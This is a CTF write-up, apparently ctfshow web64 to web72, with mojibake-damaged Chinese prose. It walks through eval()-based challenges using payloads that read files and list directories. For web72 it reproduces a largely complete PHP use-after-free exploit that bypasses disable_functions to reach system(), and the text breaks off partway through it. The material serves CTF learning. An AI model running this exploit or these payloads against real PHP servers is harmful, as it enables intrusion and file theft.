<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()æ²¡æœ‰è¢«ç¦ï¼Œç»§ç»­ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web64"><a class="header-anchor" href="#web64">Â¶</a>web64</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()æ²¡æœ‰è¢«ç¦ï¼Œç»§ç»­ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web65"><a class="header-anchor" href="#web65">Â¶</a>web65</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()æ²¡æœ‰è¢«ç¦ï¼Œç»§ç»­ä½¿ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web66"><a class="header-anchor" href="#web66">Â¶</a>web66</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»ˆäºshow_source()è¢«ç¦æ­¢äº†ï¼Œæˆ‘ä»¬å¯»æ‰¾æ–°çš„è¯»å–æ–‡ä»¶å‡½æ•°ï¼Œè¿™é‡Œå‘ç°highlight_file()å¯ä»¥è¿›è¡Œä½¿ç”¨ï¼Œæ„é€ payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p>ç„¶è€Œâ€¦<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/%7D_K%5DOYUZW9J8QDD0KB%5DHIZ9.png" alt=""><br>
è¯´flagä¸åœ¨flag.phpé‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨<code>?c=print_r(scandir(&quot;/&quot;));</code>æ‰“å°ä¸€ä¸‹æ ¹ç›®å½•<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/%28D9PGWP%29L2CRP%5DEV%24%29%7DC7JX.png" alt=""><br>
å‘ç°æœ‰ä¸€ä¸ªflag.txtï¼Œé‚£æˆ‘ä»¬ç›´æ¥è¯»å–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/NE58%40V%40%5B0O10J%7BFU%60%5B9YX_Y.png" alt=""></p>
<h3 id="web67"><a class="header-anchor" href="#web67">Â¶</a>web67</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æ‰“å°ç›®å½•å‘ç°<code>print_r()</code>è¢«ç¦ç”¨äº†ï¼Œé‚£æˆ‘ä»¬æ¢æˆ<code>var_dump</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure>
<p>å‘ç°è¿˜æ˜¯flag.txtï¼Œé‚£ç›´æ¥ä¸Špayload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web68"><a class="header-anchor" href="#web68">Â¶</a>web68</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ— ä»£ç </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡åº”è¯¥æ˜¯å§highlight_file()ç»™ç¦ç”¨äº†ï¼Œæ‰€ä»¥é¡µé¢è¿ä»£ç éƒ½æ²¡æœ‰ï¼Œç›´æ¥æŠ¥é”™ï¼Œå…ˆæŸ¥çœ‹ç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure>
<p>è¿˜æ˜¯flag.txtï¼Œè¿™é‡Œhighlight_file()è¢«ç¦ç”¨ï¼Œæˆ‘ä»¬æ¢å¦ä¸€ä¸ªï¼Œä½¿ç”¨include()å‡½æ•°ï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web69"><a class="header-anchor" href="#web69">Â¶</a>web69</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ä¾ç„¶æ˜¯highlight_file()è¢«ç¦ç”¨ä¸æ˜¾ç¤ºçš„æºç </span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ç›®å½•æ—¶å‘ç°var_dumpè¢«ç¦ç”¨äº†ï¼Œæ‰¾äº†ä¸€ä¸‹èµ„æ–™å‘ç°å‡ ç§è¯»å–ç›®å½•çš„æ–¹å¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r(glob(<span class="string">&quot;*&quot;</span>)); <span class="comment">// åˆ—å½“å‰ç›®å½•</span></span><br><span class="line">print_r(glob(<span class="string">&quot;/*&quot;</span>)); <span class="comment">// åˆ—æ ¹ç›®å½•</span></span><br><span class="line">print_r(scandir(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">$d=opendir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==($f=readdir($d)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;</span><br><span class="line">$d=dir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==($f=$d-&gt;read()))&#123;<span class="keyword">echo</span>$f.<span class="string">&quot;\n&quot;</span>;&#125;</span><br><span class="line">$a=glob(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $value)&#123;<span class="keyword">echo</span> $value.<span class="string">&quot;   &quot;</span>;&#125;</span><br><span class="line">$a=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure>
<p>å‰é¢4ä¸ªprint_réƒ½è¢«ç¦ç”¨äº†ï¼Œæˆ‘ä»¬ä½¿ç”¨åé¢å››ä¸ªä»»æ„ä¸€ä¸ªéƒ½å¯ä»¥ï¼ŒåŸç†æ˜¯é€šè¿‡éå†æ•°ç»„çš„å½¢å¼è¿›è¡Œè¯»å–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$d&#x3D;opendir(&quot;..&#x2F;..&#x2F;..&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æ ¹ç›®å½•ä¸‹è¿˜æ˜¯flag.txtï¼Œé‚£ç›´æ¥ä¸Špayload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web70"><a class="header-anchor" href="#web70">Â¶</a>web70</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ä¾ç„¶æ˜¯highlight_file()è¢«ç¦ç”¨ä¸æ˜¾ç¤ºçš„æºç </span><br></pre></td></tr></table></figure>
<p>è¯»å–ç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$d&#x3D;opendir(&quot;..&#x2F;..&#x2F;..&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Špayloadè·å–flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web71"><a class="header-anchor" href="#web71">Â¶</a>web71</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ¬æ¥è¿™æ¬¡æƒ³ç›´æ¥ç”¨payloadè¯»å–çš„ï¼Œï¼Œç»“æœğŸ˜¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web71/QN%29C%4081NPQF~C%5B5%60%7DI%402GMU.png" alt=""><br>
è¾“å‡ºäº†ä¸€å †<code>?</code>å·ï¼Œçœ‹åˆ°æºç ä¸­æœ€åæœ‰ä¸ªåŒ¹é…ï¼ŒåŒ¹é…åˆ°æ•°å­—å­—æ¯å°±ä¼šè¢«æ›¿æ¢æˆ<code>?</code>å·ï¼Œä¸è¿‡å› ä¸ºè¿™ä¸ªè¯­å¥æ˜¯æ”¾åœ¨eval()å‡½æ•°åé¢çš„ï¼Œæˆ‘ä»¬ç›´æ¥åŠ ä¸ªå¼ºè¡Œé€€å‡ºå‘½ä»¤å³å¯ï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web71/JJ%293IANL3BY%60LF9W2FOS%40JF.png" alt=""></p>
<h3 id="web72"><a class="header-anchor" href="#web72">Â¶</a>web72</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆç»§ç»­å…ˆæŸ¥çœ‹ç›®å½•ï¼Œä¸Šé¢˜çš„paylaodä¸èƒ½ç”¨äº†ï¼Œç»§ç»­æ¢åˆšåˆšåˆ—ä¸¾å‡ºæ¥çš„å¦ä¸€ä¸ª</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web72/%28%296EFGFX3J%5BND58%256%7D5%281%60J.png" alt=""><br>
å‘ç°æ”¹åå­—äº†ï¼Œflagåœ¨flag0.txtï¼Œç»§ç»­includeæ‰§è¡Œå´å‘ç°è¢«ç¦ç”¨äº†ï¼Œæ¥ç€æ‚²å‚¬çš„å‘ç°è¿™é¢˜æœ‰open_basedirå’Œdisable_functionsçš„é™åˆ¶</p>
<blockquote>
<p>open_basedirï¼šå°†PHPæ‰€èƒ½æ‰“å¼€çš„æ–‡ä»¶é™åˆ¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¸­ï¼ŒåŒ…æ‹¬æ–‡ä»¶æœ¬èº«ã€‚å½“ç¨‹åºè¦ä½¿ç”¨ä¾‹å¦‚fopen()æˆ–file_get_contents()æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„ä½ç½®å°†ä¼šè¢«æ£€æŸ¥ã€‚å½“æ–‡ä»¶åœ¨æŒ‡å®šçš„ç›®å½•æ ‘ä¹‹å¤–ï¼Œç¨‹åºå°†æ‹’ç»æ‰“å¼€</p>
<p>disable_functionsï¼šç”¨äºç¦æ­¢æŸäº›å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯é»‘åå•ï¼Œç®€å•æ¥è¯´å°±æ˜¯phpä¸ºäº†é˜²æ­¢æŸäº›å±é™©å‡½æ•°æ‰§è¡Œç»™å‡ºçš„é…ç½®é¡¹ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ºç©º</p>
</blockquote>
<p>ç„¶åæƒ³ä¸Šèšå‰‘ä¹Ÿæ²¡æœ‰bypassæˆåŠŸï¼Œå»ç½‘ä¸Šæœäº†ä¸€ä¸‹å¯åˆ©ç”¨çš„expï¼Œæ­£å¥½ç¾¤ä¸»æœ‰ç°æˆçš„å‘å‡ºæ¥ï¼Œç›´æ¥æ‹¿æ¥ç”¨<br>
expï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(<span class="string">&quot;%c&quot;</span>,($ptr &amp; <span class="number">0xff</span>));</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(<span class="string">&quot;%c&quot;</span>,($v &amp; <span class="number">0xff</span>));</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params">$arg</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span 